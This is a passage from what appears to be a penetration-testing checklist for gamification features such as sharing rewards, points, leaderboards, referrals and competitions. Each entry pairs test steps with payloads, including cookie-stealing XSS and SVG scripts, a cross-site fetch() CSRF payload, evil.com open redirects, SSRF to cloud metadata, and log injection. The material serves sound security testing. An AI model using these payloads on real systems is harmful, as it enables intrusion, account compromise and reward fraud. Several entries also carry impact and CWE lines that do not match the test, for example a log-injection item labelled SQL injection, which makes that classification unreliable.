**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. Trigger a social sharing incentive. 2. Intercept the share verification request. 3. Forge the share confirmation without actually sharing. 4. Check if the incentive is credited.

**Expected Result:** Application must verify social shares through OAuth callbacks or API verification and not trust client-provided share confirmation.

**Payload Example:**

```
POST /api/social-share/verify with shared=true and share_id=FAKE without actual social media post
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-114 — Social Share Reward Farming
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. Share content multiple times to different platforms. 2. Check if rewards stack for the same content shared multiple times. 3. Test for unlimited sharing rewards.

**Expected Result:** Application must limit social sharing rewards per content item and per time period to prevent farming.

**Payload Example:**

```
Share same product URL to 10 different platforms;share same content 100 times;check for reward caps
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## GAME-115 — Open Redirect via Social Share URL
**Test Category:** Open Redirect (WSTG-CLNT-04) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. Use the social sharing feature. 2. Intercept the share URL. 3. Modify the redirect parameter to an external malicious URL. 4. Check if users are redirected to the malicious site.

**Expected Result:** Application must validate all social sharing redirect URLs against a whitelist of allowed domains.

**Payload Example:**

```
share_url=https://target.com/share?redirect=https://evil.com;share_url=https://target.com/go?url=//evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite;Browser

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## GAME-116 — XSS via Social Share Meta Tags
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. If shared content generates Open Graph or meta tags from user data inject XSS in the source fields. 2. Share the content. 3. Check if XSS executes on the share preview page.

**Expected Result:** Application must sanitize all user data used in Open Graph meta tags and social share previews.

**Payload Example:**

```
Set product_name="><script>alert(1)</script> which appears in og:title meta tag on share page
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-117 — Social Share Token Theft
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. Check if social sharing exposes OAuth tokens or API keys. 2. Inspect the share integration for token leakage. 3. Monitor network requests during sharing.

**Expected Result:** Application must not expose OAuth tokens or social media API keys during the sharing process.

**Payload Example:**

```
Inspect network requests during share for access_token;api_key;client_secret in URLs or headers
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## GAME-118 — Social Share CSRF for Unwanted Posts
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. If sharing is integrated with social accounts craft a page that auto-shares content to victim's social profile. 2. Lure victim to visit. 3. Check if unwanted content is posted.

**Expected Result:** Application must require explicit user confirmation for social media posts and implement CSRF protection on share endpoints.

**Payload Example:**

```
<script>fetch('https://target.com/api/social/share',{method:'POST',credentials:'include',body:JSON.stringify({platform:'twitter',content:'spam'})})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## GAME-119 — Social Share Link Parameter Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. Generate a social share link. 2. Inject additional parameters into the share URL. 3. Check if injected parameters are processed by the application or social platform.

**Expected Result:** Application must construct share URLs server-side with only intended parameters and reject client-injected parameters.

**Payload Example:**

```
Modify share URL to add &ref=attacker&utm_source=phishing or inject additional path segments
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-120 — IDOR on Social Share Statistics
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. View own social sharing statistics. 2. Change user_id to view other users' sharing data. 3. Check if social accounts or sharing patterns are exposed.

**Expected Result:** Application must restrict social sharing statistics to the account owner only.

**Payload Example:**

```
GET /api/social-share/stats?user_id=1002;GET /api/users/1002/social-shares with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-121 — Social Share Callback SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. If social sharing uses callback URLs intercept and modify the callback. 2. Set to internal service address. 3. Check for SSRF through the social share verification callback.

**Expected Result:** Application must validate social share callback URLs and restrict them to known social platform domains.

**Payload Example:**

```
callback_url=http://169.254.169.254/latest/meta-data/;verify_url=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## GAME-122 — Points Transaction Log Injection
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Perform a points transaction with CRLF or log injection payloads in the description. 2. Check if the transaction log is contaminated. 3. Verify log integrity.

**Expected Result:** Application must sanitize all data written to transaction logs and prevent log injection attacks.

**Payload Example:**

```
transaction_description=Normal%0d%0a[ADMIN] Manual credit 999999 points%0d%0a;note=test\nFake log entry
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-123 — Points API Mass Assignment
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Perform a points operation. 2. Add hidden parameters like is_verified=true or admin_credit=true or bypass_limit=true. 3. Check if unauthorized fields are processed.

**Expected Result:** Application must whitelist allowed parameters for points operations and ignore any unexpected fields.

**Payload Example:**

```
Add is_verified=true&admin_override=true&credit_source=manual&bypass_validation=true to points request body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## GAME-124 — Points Currency Exchange Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. If points can be exchanged between currencies or types intercept the exchange. 2. Modify the exchange_rate parameter. 3. Check if manipulated rate is accepted.

**Expected Result:** Application must determine exchange rates server-side from current rates and not accept client-provided exchange values.

**Payload Example:**

```
Change exchange_rate=1.0 to exchange_rate=100.0 in POST /api/points/exchange
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-125 — Badge Sharing Mechanism Exploitation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. If badges can be shared or displayed publicly check for information leakage. 2. Verify if badge metadata exposes earning criteria or user activity. 3. Test badge URL manipulation.

**Expected Result:** Application must only expose intended public badge information and not leak private user activity through badge metadata.

**Payload Example:**

```
Access /api/badges/shared/BADGE-HASH and check for user_activity;earning_details;account_info in response
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-126 — Badge Notification Injection
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. Earn a badge that triggers a notification. 2. If badge name or description is reflected in the notification check for XSS. 3. Test in notification popup and email.

**Expected Result:** Application must sanitize badge data in all notification contexts including popups and emails.

**Payload Example:**

```
Earn badge with custom data containing <script>alert(1)</script> that appears in notification
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-127 — Tier Benefit API Exploitation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Identify API endpoints for tier-specific benefits. 2. Access premium tier endpoints with a basic tier account. 3. Modify tier_level in JWT or request parameters.

**Expected Result:** Application must validate tier level from authenticated user data server-side before granting tier-specific benefits.

**Payload Example:**

```
GET /api/benefits/platinum with bronze-tier user;modify X-User-Tier: platinum header;change JWT tier claim
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;jwt_tool

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-128 — Level Progression Exploit via Repetitive Actions
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Identify the cheapest or fastest action that grants XP. 2. Automate the action to rapidly gain XP. 3. Check for anti-automation measures and XP caps per action type.

**Expected Result:** Application must implement diminishing returns and rate limiting on XP-earning actions to prevent grinding exploits.

**Payload Example:**

```
Automate lowest-effort XP action 10000 times;check for per-action XP caps and daily limits
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-129 — Leaderboard Position Spoofing via Batch Score Submission
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Check if batch score submission endpoints exist. 2. Submit inflated scores in bulk. 3. Verify if server validates each score individually in batch operations.

**Expected Result:** Application must validate each score entry individually in batch submissions and reject invalid or anomalous scores.

**Payload Example:**

```
POST /api/leaderboard/batch-submit with array of inflated scores [{score:999999};{score:888888}]
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-130 — Leaderboard Reset Timing Exploit
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Check leaderboard reset schedule. 2. Submit scores at the exact reset boundary. 3. Check if scores count for both periods. 4. Test for double-counting at boundaries.

**Expected Result:** Application must handle leaderboard period boundaries atomically to prevent score double-counting.

**Payload Example:**

```
Submit score at exactly the leaderboard reset time to check for dual-period counting
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## GAME-131 — Challenge Sharing Token Exploitation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. If challenges can be shared via tokens capture the share token. 2. Modify token parameters. 3. Check if token grants unintended access or reveals private challenge data.

**Expected Result:** Application must use signed non-modifiable share tokens with proper expiry and scope limitations.

**Payload Example:**

```
Modify shared challenge token to change scope;decode share_token JWT and modify permissions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;jwt_tool

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-132 — Quest Reward Type Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. Complete a quest. 2. Intercept the reward claim. 3. Modify reward_type from points to premium_item or cash. 4. Check if the manipulated reward type is granted.

**Expected Result:** Application must determine quest rewards server-side based on quest configuration and not accept client-specified reward types.

**Payload Example:**

```
Change reward_type=points to reward_type=premium_voucher or reward_type=cash_credit in claim request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-133 — Daily Reward Calendar Data Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Access the daily reward calendar data. 2. Intercept the response showing upcoming rewards. 3. Modify future reward values. 4. Claim rewards at manipulated values.

**Expected Result:** Application must serve daily reward values from immutable server-side configuration and validate at claim time.

**Payload Example:**

```
Intercept daily reward calendar and change day_7_reward from 50 to 50000;submit claim with modified data
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-134 — Daily Reward Multiple Account Exploitation
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Create multiple accounts. 2. Claim daily rewards on each. 3. Transfer rewards to one primary account. 4. Check for multi-account detection.

**Expected Result:** Application must detect and prevent multi-account daily reward farming through IP fingerprinting and device tracking.

**Payload Example:**

```
Create 10 accounts;claim daily rewards on each;transfer all to main account
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-135 — Streak Recovery Token Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. If streak recovery tokens exist check how they are generated. 2. Attempt to generate unlimited recovery tokens. 3. Use tokens to maintain streaks indefinitely without actual activity.

**Expected Result:** Application must limit streak recovery tokens per user and validate their generation conditions server-side.

**Payload Example:**

```
POST /api/streaks/generate-recovery multiple times;modify recovery_tokens_remaining count
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-136 — Streak Activity Verification Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. Trigger streak activity tracking. 2. Intercept and forge the activity verification without performing the actual activity. 3. Check if the streak is maintained through forged activities.

**Expected Result:** Application must verify streak-qualifying activities through server-side validation and not accept client claims of activity completion.

**Payload Example:**

```
POST /api/streaks/log-activity with activity_completed=true without performing actual qualifying action
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-137 — Referral Link Token Tampering
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Generate a referral link. 2. Decode and modify the referral token. 3. Change the referrer_id to credit rewards to a different user. 4. Share the modified link.

**Expected Result:** Application must use cryptographically signed referral tokens that cannot be tampered with to change the referrer.

**Payload Example:**

```
Decode referral token;modify referrer_id=1002;re-encode and share modified link
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;jwt_tool;Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-138 — Referral Conversion Attribution Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. If referral attribution uses cookies or URL parameters intercept and modify them. 2. Override legitimate referral attribution. 3. Check if rewards go to wrong referrer.

**Expected Result:** Application must implement secure referral attribution that cannot be overridden through cookie or parameter manipulation.

**Payload Example:**

```
Modify referral_cookie from ref=legitimate_user to ref=attacker;override UTM referral parameters
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## GAME-139 — Loyalty Program Tier Criteria Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Access loyalty tier criteria endpoints. 2. Check if spending thresholds or qualification criteria expose business-sensitive information. 3. Check for undocumented tiers.

**Expected Result:** Application must only expose tier criteria relevant to the user and not reveal internal business configuration.

**Payload Example:**

```
GET /api/loyalty/tiers/all showing internal_tier_config;spending_thresholds;undocumented_tiers
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## GAME-140 — Loyalty Program Partner Integration SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. If loyalty program integrates with partner services check for SSRF. 2. Modify partner verification URLs. 3. Attempt to access internal services through partner integration.

**Expected Result:** Application must validate and whitelist all partner service URLs and prevent SSRF through loyalty integrations.

**Payload Example:**

```
partner_verify_url=http://169.254.169.254/latest/meta-data/;partner_callback=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## GAME-141 — Progress Tracking Privacy Violation
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. Check what progress data is collected. 2. Verify if detailed behavioral data is stored. 3. Check for data retention policies. 4. Test if progress data is shared with unauthorized parties.

**Expected Result:** Application must collect only necessary progress data and comply with privacy regulations regarding behavioral tracking.

**Payload Example:**

```
Review /api/progress response for detailed_activity_log;browsing_history;session_duration;click_tracking data
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Manual Review

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## GAME-142 — Progress Milestone Notification Injection
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. Reach a progress milestone. 2. If milestone names contain user data check for XSS in milestone notifications. 3. View notification rendering.

**Expected Result:** Application must sanitize all data in progress milestone notifications before rendering.

**Payload Example:**

```
Set goal_name=<script>alert(document.cookie)</script> and reach milestone triggering notification with this name
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-143 — Milestone Criteria Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. Approach a milestone threshold. 2. Send concurrent actions that individually do not meet criteria but collectively do. 3. Send simultaneous claim requests. 4. Check for duplicate rewards.

**Expected Result:** Application must evaluate milestone criteria atomically and prevent duplicate claims from concurrent threshold crossings.

**Payload Example:**

```
Send concurrent purchase requests totaling milestone threshold followed by simultaneous claim requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-144 — Milestone Image XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. If milestones display custom images or badges check for XSS via SVG upload. 2. Upload SVG containing JavaScript. 3. View milestone display page.

**Expected Result:** Application must sanitize SVG uploads and strip JavaScript before rendering milestone images.

**Payload Example:**

```
Upload SVG: <svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg> as milestone badge
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-145 — Competition Participant Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Access competition participant list. 2. Check if detailed participant information is exposed. 3. Enumerate participant IDs. 4. Access individual participant data.

**Expected Result:** Application must only display necessary public information about competition participants and protect private data.

**Payload Example:**

```
GET /api/competitions/COMP-001/participants exposing email;phone;address;account_details of participants
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## GAME-146 — Competition Rule Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Access competition rule endpoints. 2. Attempt to modify rules or scoring criteria via API. 3. Check if rule modification is restricted to admin roles.

**Expected Result:** Application must restrict competition rule modification to authorized administrators with proper audit logging.

**Payload Example:**

```
PUT /api/competitions/COMP-001/rules with regular user credentials;modify scoring_formula or eligibility_criteria
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-147 — Competition Entry Fee Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Enter a paid competition. 2. Intercept the entry request. 3. Modify the entry_fee parameter to 0 or reduce it. 4. Check if entry is accepted without proper payment.

**Expected Result:** Application must validate competition entry fees server-side and not accept client-provided fee amounts.

**Payload Example:**

```
Change entry_fee=100 to entry_fee=0 in POST /api/competitions/COMP-001/enter
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-148 — Competition Withdrawal After Results
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Enter a competition and win. 2. Claim the prize. 3. Attempt to withdraw from the competition after claiming. 4. Check if entry fee is also refunded creating double benefit.

**Expected Result:** Application must prevent withdrawal after prize claiming and handle competition lifecycle state consistently.

**Payload Example:**

```
POST /api/competitions/COMP-001/withdraw after POST /api/competitions/COMP-001/claim-prize
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-149 — Reward Gift Card Code Generation Prediction
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Redeem multiple gift card rewards. 2. Collect the generated codes. 3. Analyze the pattern for predictability. 4. Attempt to predict and use unredeemed codes.

**Expected Result:** Application must generate gift card and redemption codes using cryptographically secure random generation.

**Payload Example:**

```
Collect codes GC-A1B2C3;GC-A1B2C4;GC-A1B2C5 and test predicted GC-A1B2C6 through GC-A1B2C9
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## GAME-150 — Reward Redemption History IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. View own redemption history. 2. Change user_id to view other users' redemption records. 3. Check if redemption details including codes and delivery information are exposed.

